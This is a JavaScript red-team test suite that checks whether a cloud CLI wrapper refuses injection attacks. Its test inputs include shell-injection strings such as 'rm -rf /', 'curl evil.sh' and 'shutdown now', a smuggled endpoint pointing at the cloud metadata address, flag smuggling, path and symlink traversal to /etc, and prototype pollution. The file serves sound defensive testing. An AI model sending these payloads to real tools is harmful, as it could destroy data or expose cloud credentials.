// v0.43.0 RED TEAM PASS (war-room Play 4) — try to break the cloud tool
// before it ships: shell injection, flag smuggling, path + symlink escapes,
// bucket/container/prefix abuse, proto pollution, junk actions. Every attack
// must be REFUSED HONESTLY (string starting with ERROR / refused / blocked)
// and must NEVER throw. A crash or a fake success = ship blocked.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { runCloud } from '../src/tools/cloud.js';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'v43-redteam-'));
fs.mkdirSync(path.join(root, 'site'));
const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'v43-redteam-out-'));
fs.symlinkSync(outside, path.join(root, 'out'));

const clis = () => ({ aws: 'aws-cli/2.17.0', gcloud: 'Google Cloud SDK 489.0.0', az: 'azure-cli 2.61.0' });
const none = () => ({ aws: null, gcloud: null, az: null });

const attacks = [
  // ── provider / service injection ──────────────────────────────────────────
  ['cloud provider injection', () => runCloud({ action: 'list', provider: 'aws; rm -rf /', service: 's3' }, { root, probe: clis })],
  ['cloud provider $() inject', () => runCloud({ action: 'list', provider: '$(whoami)', service: 'compute' }, { root, probe: clis })],
  ['cloud service injection', () => runCloud({ action: 'list', provider: 'aws', service: 's3; shutdown now' }, { root, probe: clis })],
  ['cloud service subcmd smuggle', () => runCloud({ action: 'list', provider: 'aws', service: 's3 --recursive --no-verify-ssl' }, { root, probe: clis })],
  ['cloud service proto pollution', () => runCloud({ action: 'list', provider: 'gcp', service: { __proto__: { evil: true } } }, { root, probe: clis })],
  // ── flag/value smuggling through validated fields ────────────────────────
  ['cloud region injection', () => runCloud({ action: 'list', provider: 'aws', service: 's3', region: 'us-east-1; curl evil.sh' }, { root, probe: clis })],
  ['cloud region endpoint smuggle', () => runCloud({ action: 'list', provider: 'aws', service: 's3', region: 'us-east-1 --endpoint-url http://169.254.169.254' }, { root, probe: clis })],
  ['cloud region newline smuggle', () => runCloud({ action: 'list', provider: 'aws', service: 's3', region: 'us-east-1\n--no-verify-ssl' }, { root, probe: clis })],
  ['cloud project traversal', () => runCloud({ action: 'list', provider: 'gcp', service: 'compute', project: '../../evil-proj' }, { root, probe: clis })],
  ['cloud huge region flood', () => runCloud({ action: 'list', provider: 'aws', service: 's3', region: 'a'.repeat(10000) }, { root, probe: clis })],
  // ── deploy: buckets, containers, prefixes, dirs ───────────────────────────
  ['cloud bucket traversal', () => runCloud({ action: 'deploy', provider: 'aws', dir: 'site/', bucket: 's3://../../etc' }, { root, probe: clis })],
  ['cloud bucket flag smuggle', () => runCloud({ action: 'deploy', provider: 'aws', dir: 'site/', bucket: '--acl public-read' }, { root, probe: clis })],
  ['cloud bucket dot-dot', () => runCloud({ action: 'deploy', provider: 'gcp', dir: 'site/', bucket: 'a..b' }, { root, probe: clis })],
  ['cloud container dash abuse', () => runCloud({ action: 'deploy', provider: 'azure', dir: 'site/', container: 'a--b; curl evil' }, { root, probe: clis })],
  ['cloud prefix traversal', () => runCloud({ action: 'deploy', provider: 'aws', dir: 'site/', bucket: 'ok-bucket', prefix: 'a/../../c' }, { root, probe: clis })],
  ['cloud dir absolute /etc', () => runCloud({ action: 'deploy', provider: 'aws', dir: '/etc', bucket: 'ok-bucket' }, { root, probe: clis })],
  ['cloud dir traversal', () => runCloud({ action: 'deploy', provider: 'gcp', dir: '../../etc', bucket: 'ok-bucket' }, { root, probe: clis })],
  ['cloud dir symlink escape', () => runCloud({ action: 'deploy', provider: 'aws', dir: 'out', bucket: 'ok-bucket' }, { root, probe: clis })],
  ['cloud deploy missing bucket', () => runCloud({ action: 'deploy', provider: 'aws', dir: 'site/' }, { root, probe: clis })],
  // ── actions + honesty ─────────────────────────────────────────────────────
  ['cloud action proto pollution', () => runCloud({ action: '__proto__' }, { root, probe: clis })],
  ['cloud action garbage object', () => runCloud({ action: {} }, { root, probe: none })],
  ['cloud no-cli honest refusal', () => runCloud({ action: 'list', provider: 'aws', service: 's3' }, { root, probe: none })],
];

let pass = 0, fail = 0;
for (const [name, fn] of attacks) {
  try {
    const out = String(await fn());
    const refused = /^(ERROR:|.*refused|.*blocked|.*escapes|.*resolves outside|.*not found|.*bad |.*unknown |.*too many|.*too long)/.test(out);
    if (refused) { pass++; console.log(`  ✔ ${name} → ${out.split('\n')[0].slice(0, 88)}`); }
    else { fail++; console.log(`  ✖ ${name} → NOT REFUSED: ${out.slice(0, 120)}`); }
  } catch (e) {
    fail++; console.log(`  ✖ ${name} → THREW: ${String(e && e.message || e).slice(0, 120)}`);
  }
}

// targeted neutralization check: a truthy junk `delete` must NEVER reach argv
// as --delete (flag smuggling dies here) — the deploy itself may honestly run.
{
  let captured = [];
  const out = String(await runCloud({ action: 'deploy', provider: 'aws', dir: 'site/', bucket: 'ok-bucket', delete: '1 --recursive' }, { root, probe: clis, runner: (argv) => { captured = argv; return { status: 0, stdout: 'ok', stderr: '' }; } }));
  const neutralized = out.startsWith('deploy ok') && !captured.includes('--delete');
  if (neutralized) { pass++; console.log('  ✔ cloud delete flag neutralized → junk truthy string dropped, --delete NOT in argv'); }
  else { fail++; console.log(`  ✖ cloud delete flag neutralized → argv: ${captured.join(' ')}`); }
}

const total = attacks.length + 1;
console.log(`\nRED TEAM: ${pass}/${total} attacks refused honestly, ${fail} failures`);
process.exit(fail ? 1 : 0);
